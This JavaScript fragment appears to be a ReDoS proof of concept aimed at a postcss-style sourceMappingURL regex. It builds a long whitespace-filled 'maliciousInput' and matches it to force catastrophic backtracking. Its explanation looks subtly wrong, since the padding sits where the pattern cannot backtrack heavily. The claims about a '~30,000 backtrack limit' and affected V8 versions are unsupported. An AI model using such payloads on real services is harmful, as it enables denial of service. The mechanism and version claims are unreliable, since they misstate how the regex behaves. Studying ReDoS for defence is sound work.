  const REDOS_REGEX = /\/\*\s*# sourceMappingURL=(.*)\*\//;

  // Construct a highly repetitive payload designed to maximize ambiguous matching paths.
  // In JavaScript's regex engine, the overlap between \s* (greedy whitespace match) 
  // and .*(rest of string match) before the hard boundary \*/ creates combinatorial 
  // explosion during backtracking when the final check fails or is ambiguous.
  const depth = 18000;
  // Mixed high-frequency whitespace to force maximum state exploration in the engine
  const maliciousInput = '/* # sourceMappingURL=' + ('\n '.repeat(depth)) + '!';

  // Executing .match() here will trigger catastrophic backtracking in susceptible 
  // JavaScript engines (e.g., V8 < 9.4 or unpatched postcss versions). Because we 
  // deliberately push past the ~30,000 backtrack limit, it will expose internal 
  // recursion exhaustion or severe CPU/timeout degradation.
  const matchResult = maliciousInput.match(REDOS_REGEX);

